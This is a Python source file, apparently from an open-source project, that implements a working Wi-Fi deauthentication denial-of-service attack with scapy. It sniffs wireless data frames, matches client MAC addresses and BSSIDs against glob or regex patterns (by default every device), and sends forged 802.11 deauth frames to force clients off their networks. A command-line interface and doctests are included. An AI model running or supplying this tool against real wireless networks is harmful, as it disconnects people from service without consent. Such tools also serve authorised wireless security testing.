#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This file implement a Dos attack on Wifi named Deauth. """

###################
#    This file implement a Dos attack on Wifi named Deauth.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from scapy.all import sniff, Dot11, RadioTap, Dot11Deauth, packet, conf, sendp
from logging import info, warning, debug
from argparse import ArgumentParser
from platform import system
from fnmatch import fnmatch
import logging
import re


class WifiDeauth:

    """This class implement Deauth Wifi attack (DoS Wifi attack).

    targets(str) = "*": MAC address to Deauth (use glob and regex syntax), default deauth all
    bssid(str) = "*": gateway BSSID (use glob and regex syntax), default all BSSID is used
    interface(str) = None: if interface use this interface else use default scapy interface
    """

    def __init__(
        self,
        targets: str = "*",
        bssid: str = "*",
        interface: str = None,
        debug: int = 0,
        **kwargs,
    ):
        self.targets = targets
        self.bssid = bssid
        self.interface = interface
        self.debug = 50 - debug * 10

        logging.basicConfig(
            format="%(asctime)s %(levelname)s : %(message)s",
            datefmt="%m/%d/%Y %H:%M:%S",
            level=self.debug,
            **kwargs,
        )

    def sniff(self):

        """This function sniff the network traffic and launch deaut attack if
        is Dot11 packet and BSSID, source MAC address and interface match.
        """

        if system() == "Windows":
            conf.iface.setmonitor(True)
            warning(f"Set {conf.iface} in mode monitor.")

        info("Start sniffing...")

        try:
            sniff(iface=self.interface, prn=self.deauth, lfilter=self.check_packet)
        except KeyboardInterrupt:
            pass
        finally:
            info("Stop sniffing.")
            if system() == "Windows":
                conf.iface.setmonitor(False)
                warning(f"Set {conf.iface} in mode managed.")

    def check_packet(self, packet: packet.Packet) -> bool:

        """This function is a filter, if return True launch
        Deauth if return False don't launch Deauth.

        >>> from scapy.all import Ether, IP, TCP; addr=":".join(["0A"]*6); deauth = WifiDeauth()
        >>> assert not deauth.check_packet(RadioTap())
        >>> assert not deauth.check_packet(RadioTap()/Dot11(type=0, subtype=12, addr1=addr, addr2=addr, addr3=addr))
        >>> assert deauth.check_packet(RadioTap()/Dot11(type=2, subtype=12, addr1=addr, addr2="01:01:01:01:01:01", addr3=addr))
        >>> assert not deauth.check_packet(Ether()/IP()/TCP())
        """

        debug(f"Check packet: {packet.summary()}")
        return (
            packet.haslayer(Dot11)
            and packet.type == 2
            and packet.addr2 != packet.addr3
            and self.check_addr(packet)
        )

    def deauth(self, packet: packet.Packet) -> None:

        """This function send Deauth packet."""

        sendp(
            RadioTap()
            / Dot11(
                type=0,
                subtype=12,
                addr1=packet.addr2,
                addr2=packet.addr3,
                addr3=packet.addr3,
            )
            / Dot11Deauth(reason=7),
            iface=self.interface,
            verbose=0,
        )
        info(f"Send deauth to {packet.addr2}")

    def check_addr(self, packet: packet.Packet) -> bool:

        """This function is filter and analyse MAC source and BSSID.

        >>> addr=":".join(["0A"]*6); deauth = WifiDeauth()
        >>> assert deauth.check_addr(RadioTap()/Dot11(type=0, subtype=12, addr1=addr, addr2=addr, addr3=addr))
        >>> deauth = WifiDeauth(addr, addr)
        >>> assert deauth.check_addr(RadioTap()/Dot11(type=0, subtype=12, addr1=addr, addr2=addr, addr3=addr))
        >>> deauth = WifiDeauth("*:*", "*:*")
        >>> assert deauth.check_addr(RadioTap()/Dot11(type=0, subtype=12, addr1=addr, addr2=addr, addr3=addr))
        >>> deauth = WifiDeauth("0A:.*", ".*:0A")
        >>> assert deauth.check_addr(RadioTap()/Dot11(type=0, subtype=12, addr1=addr, addr2=addr, addr3=addr))
        >>> deauth = WifiDeauth("^[A-Za-z0-9]{2}$", "^[A-Za-z0-9]{2}$")
        >>> assert not deauth.check_addr(RadioTap()/Dot11(type=0, subtype=12, addr1=addr, addr2=addr, addr3=addr))
        """

        debug(
            f"Check packet with address source: {packet.addr2} and BSSID: {packet.addr3}"
        )
        return (
            fnmatch(packet.addr2, self.targets) or re.match(self.targets, packet.addr2)
        ) and (fnmatch(packet.addr3, self.bssid) or re.match(self.bssid, packet.addr3))


def parse():
    parser = ArgumentParser()
    parser.add_argument("--verbose", "-v", action="count", default=0)
    parser.add_argument("--targets", "-t", default="*")
    parser.add_argument("--bssid", "-b", default="*")
    parser.add_argument("--interface", "-i", default=None)
    return parser.parse_args()


def main():
    args = parse()
    deauth = WifiDeauth(args.targets, args.bssid, args.interface, args.verbose)
    deauth.sniff()


if __name__ == "__main__":
    main()
